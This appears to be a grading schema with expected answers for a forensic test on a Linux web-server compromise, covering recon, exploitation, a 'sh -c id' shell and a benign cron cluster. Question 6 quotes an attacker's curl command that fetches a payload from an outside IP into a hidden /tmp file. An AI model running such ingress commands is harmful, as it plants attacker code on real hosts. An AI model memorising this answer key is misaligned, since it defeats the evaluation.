# Grading Schema — single-host-linux-rce

Each question is worth 10 points. Total: 100. Applied per the process in
this directory's `AGENTS.md`.

## Q1 — First indication of suspicious activity, and when
**Expected:** The nikto-style web scan against APP-01 from `154.16.92.201`,
~02:06 UTC (first web_scan/Zeek/ASA rows around 2026-08-14T02:06Z).
**Full credit:** Correct event + approximately correct time (within a few
minutes).
**Partial:** Right event, wrong/missing time, or vice versa.
**Zero:** Names the exploitation step (~02:17) as the first sign, missing
recon entirely.

## Q2 — Technique against the app server + proof of code execution
**Expected:** Exploitation of a public-facing application endpoint (POST to
`/admin/config/import`, `200` response) immediately followed by a shell
spawning (`/bin/sh -c id`) as `www-data` — the *process* evidence is what
proves code execution, the HTTP response alone does not.
**Full credit:** Cites both the web/Zeek HTTP evidence and the process
evidence, and does not assert a specific vulnerability class/CVE as
confirmed fact.
**Partial:** Cites only one evidence source, or correctly hedges without
full detail.
**Zero:** Asserts a specific named vulnerability or CVE as confirmed —
over-claim; see BRIEFING.md.

## Q3 — Account executing the post-exploit activity
**Expected:** `www-data` — a service account, not a human user.
**Full credit:** Identifies `www-data` and correctly frames it as a
service/system account, not `sam.ortiz` or another human.
**Zero:** Attributes the activity to a human user.

## Q4 — Source IP and its recurrence
**Expected:** `154.16.92.201`, present in the recon scan, the exploitation
POST, and the later curl/ingress fetch — the same actor across all three
stages.
**Full credit:** Correct IP and correctly ties it across all three
storyline steps.
**Partial:** Correct IP without connecting it across stages.

## Q5 — Post-exploitation commands and their meaning
**Expected:** `id` (via `sh -c id`) — confirms the attacker's effective
user context (`www-data`). This is verification/discovery, not further
exploitation.
**Full credit:** Names the command and correctly frames it as identity
verification rather than a separate attack step.

## Q6 — Post-access network activity + payload determinability
**Expected:** `curl -s http://154.16.92.201/dl/pkg-47a1 -o /tmp/.cache-47a1`
— an outbound HTTP GET fetching a file to `/tmp/.cache-47a1`. **The
payload's contents cannot be determined from the evidence given.**
**Full credit:** Identifies the fetch AND explicitly states the contents are
undetermined.
**Zero / hard penalty:** Asserts a specific malware family or payload
contents as fact.

## Q7 — Discrimination: is the python/sh/gzip cluster part of the incident?
**Expected:** No. Distinguishing evidence: different account (`svc-deploy`
vs. `www-data`), no preceding external HTTP request, no outbound network
connection, distinct cron/deploy parent lineage, and recurrence as a
scheduled pattern rather than a one-off.
**Full credit:** Correct "not part of the attack" conclusion AND at least
two of the distinguishing points above.
**Partial:** Correct conclusion, weak or missing justification.
**Zero:** Calls it malicious, part of the attack, or flags it without
addressing the distinguishing evidence.

## Q8 — Timeline reconstruction
**Expected chronology (UTC):**
1. ~02:06 — recon/web scan from `154.16.92.201`
2. ~02:17 — exploitation POST + `sh -c id` (code execution as `www-data`)
3. ~02:24 — curl ingress fetch to `154.16.92.201`
**Full credit:** All three steps present, correctly ordered, timestamps
within a few minutes of the above.
**Partial:** One step missing or misordered.
**Note:** The `rh-nightly-maintenance` cluster (~03:30) should not appear in
this timeline as part of the incident — if it does, that's graded against
Q7, not double-penalized here.

## Q9 — Stakeholder summary (report generation, qualitative)
**Rubric (LLM-judge, holistic 0-10):** Does the summary correctly convey
(a) what happened — scan, exploit, code execution, outbound fetch;
(b) what's confirmed vs. not — payload contents and the exact vulnerability
are explicitly unconfirmed; (c) plain, non-technical language;
(d) no invented detail beyond the evidence. A technically accurate but
over-confident summary should score lower than a slightly less complete but
appropriately hedged one.

## Q10 — Lateral movement / WS-OP-01 involvement
**Expected:** No evidence of lateral movement to WS-OP-01 or of the
attacker using `sam.ortiz`'s account. All attacker activity is confined to
APP-01 under `www-data`.
**Full credit:** States no lateral movement found, ideally noting the
absence of any WS-OP-01 evidence tied to the external IP or `www-data`.
**Zero:** Claims lateral movement occurred, or refuses to answer/expresses
unwarranted high uncertainty despite the evidence supporting a confident
"no."
